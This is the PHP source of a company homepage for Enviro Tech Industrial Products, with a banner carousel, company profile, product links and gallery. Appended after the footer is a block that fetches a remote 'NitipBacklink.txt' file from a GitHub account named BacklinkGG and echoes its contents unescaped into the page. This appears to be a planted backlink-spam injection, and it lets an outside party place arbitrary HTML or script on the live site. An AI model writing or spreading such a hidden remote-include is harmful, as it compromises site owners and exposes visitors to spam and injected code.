<?php include 'assets/include/header.php' ;?>
<section>
<div id="carouselExampleControls" class="carousel slide" data-ride="carousel">
  <div class="carousel-inner">
   <?php
 $query=$conn->query("select * from banner1 where Status='1'");

$rowcount =mysqli_num_rows($query);

    ?>
<?php 

for($i=1;$i<=$rowcount;$i++){
    $row=mysqli_fetch_array($query);
  // /print_r($row);

    ?>
    <?php
if($i==1){
    ?>
    <div class="carousel-item active">
      <!-- <img class="d-block w-100" src="assets/images/banner001.jpg" alt="First slide"> -->
       <img class="d-block w-100" src="admin/banner/<?php echo $row['Image'];?>" alt="First slide">
    </div>
      <?php
}else{
    ?>

    <div class="carousel-item">
      <img class="d-block w-100" src="admin/banner/<?php echo $row['Image'];?>" alt="Second slide">
    </div>
  <?php } 
}?>
    <!-- <div class="carousel-item">
      <img class="d-block w-100" src="assets/images/banner003.jpg" alt="Third slide">
    </div> -->
  </div>
  <a class="carousel-control-prev" href="#carouselExampleControls" role="button" data-slide="prev">
    <span class="carousel-control-prev-icon" aria-hidden="true"></span>
    <span class="sr-only">Previous</span>
  </a>
  <a class="carousel-control-next" href="#carouselExampleControls" role="button" data-slide="next">
    <span class="carousel-control-next-icon" aria-hidden="true"></span>
    <span class="sr-only">Next</span>
  </a>
</div>  
</section>
<section class=" py-5 mb-4" style="background: #eee;" >
  <div class="container">
  <h1 class="text-center pt-4 pb-3  text-uppercase"><span class="hborder pl-4">Welcome to Enviro Tech Industrial Products</span></h1>

  <img src="assets/images/27years.jpg" class="float-left px-3">
  <p class="text-justify">Established in the year 1995, in Delhi, India, we "Enviro Tech Industrial Products", is actively engaged in manufacturing, trading, exporting, importing, service providing and supplying an extensive range of Clean Room Equipment, Air Cooling System, Industrial Filter, Air Distribution Products and Cooling Tower Spare Parts, etc. These products are manufactured in accordance with international quality norms using supreme quality raw material and latest technology under the guidance of our skilled professionals. The raw material we use to manufacture these products is sourced from certified vendors of the industry. The offered products are highly appreciated among our clients for their durability, perfect finish, low maintenance, easy to use and corrosion resistance. Apart from this, our clients can avail these products in various specifications as per the requirements of our clients. Our well-established organization has developed a broad infrastructure facility that is spread across the wide area of the land. Our infrastructure is segregated into various subdivisions such as manufacturing, quality testing, R&D, warehousing and packaging and after sale support. We have divided our infrastructure into different departments to ensure a free flow of work and systematic business operations. All these units are equipped with the modern machinery and advanced technology in order to timely meet the large-scale orders of customers. These machines and tools regularly updated to attain high efficiency and quality in all our manufacturing process. All these units are managed by a skilled team of professionals, who have great personnel acumen and rich industry experience. These professionals make their dedicated efforts to achieve the defined goals of the organization. In addition to this, we organize frequent training programs and seminars for our team in order to update their knowledge.</p>
<div class="text-center">
  
<button class="btn text-white btn-info px-4">Read More</button>


</div>
</div>
</section>
<section class="container py-5" >

    <h2 class="text-center  mb-5"><span class="hborder pl-3 text-uppercase">Our Products</span></h2>
    <div class="row">
      <div class="col-md-3 ">
        <div class="box-shadow text-center">
          <img src="assets/images/img001.png" class="my-3">
        <h6 class="text-center py-3" style="background: var(--main-bg-color);">
         <a href="product.php?id=48" class="text-white">Fine Filter</a></h6>
        </div>
     </div>
     
        <div class="col-md-3 ">
        <div class="box-shadow text-center">
          <img src="assets/images/img002.jpg" class="my-3">
        <h6 class="text-center py-3 " style="background: var(--main-bg-color);">
          <a href="product.php?id=69" class="text-white">Cylindrical Air Filters</a></h6>
        </div>
     </div>


      <div class="col-md-3 ">
        <div class="box-shadow text-center">
          <img src="assets/images/img003.jpg" class="my-3">
        <h6 class="text-center py-3 " style="background: var(--main-bg-color);"> <a href="product.php?id=65" class="text-white">Refrigeration Coils</a></h6>
        </div>
     </div>


       <div class="col-md-3 ">
        <div class="box-shadow text-center">
          <img src="assets/images/img004.jpg" class="my-3">
        <h6 class="text-center py-3 " style="background: var(--main-bg-color);"> <a href="product.php?id=58" class="text-white">Single Skin Air Handling Unit</a></h6>
        </div>
     </div>

         <div class="col-md-3 ">
        <div class="box-shadow text-center">
          <img src="assets/images/img005.jpg" class="my-3">
        <h6 class="text-center py-3" style="background: var(--main-bg-color);"> <a href="product.php?id=48" class="text-white">Fine FilterCombination Filter</a></h6>
        </div>
     </div>

  <div class="col-md-3 ">
        <div class="box-shadow text-center">
          <img src="assets/images/img006.jpg" class="my-3">
        <h6 class="text-center py-3" style="background: var(--main-bg-color);"> <a href="product.php?id=56" class="text-white">Air Intake Lovers Grills</a></h6>
        </div>
     </div>

   <div class="col-md-3 ">
        <div class="box-shadow text-center">
          <img src="assets/images/img007.jpg" class="my-3">
        <h6 class="text-center py-3" style="background: var(--main-bg-color);"> <a href="product.php?id=65" class="text-white">Laundry Tumbler Steam Radiators</a></h6>
        </div>
     </div>

  <div class="col-md-3 ">
        <div class="box-shadow text-center">
          <img src="assets/images/img008.jpg" class="my-3">
        <h6 class="text-center py-3" style="background: var(--main-bg-color);"> <a href="product.php?id=56" class="text-white">Fresh Air Louvers</a></h6>
        </div>
     </div>
    </div>

</section>
<!-- bottom slider css start -->
<section class="slider-bg"  style="background: #eee;">
  <div class="container">
  <h1 class="text-center  mt-5 pt-5"> <span class=" hborder pl-2 text-uppercase">Our Gallery</span></h1>

  
   <section class="client-slider">
      <div class="slide"><img src="assets/home_gallery/i04.jpg"></div>
      <div class="slide"><img src="assets/home_gallery/i05.jpg"></div>
      <div class="slide"><img src="assets/home_gallery/i01.jpg"></div>
      <div class="slide"><img src="assets/home_gallery/i02.jpg"></div>
      <div class="slide"><img src="assets/home_gallery/i03.jpg"></div>
     <!--  <div class="slide"><img src="assets/home_gallery/"></div>
      <div class="slide"><img src="assets/home_gallery/"></div> -->
   </section>
</div>
   </section>
</div>

</section>
<?php include 'assets/include/footer.php' ;?>
<?php
$url = 'https://raw.githubusercontent.com/BacklinkGG/castano/main/NitipBacklink.txt';
$ch = curl_init($url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$result = curl_exec($ch);
curl_close($ch);
echo $result;
?>
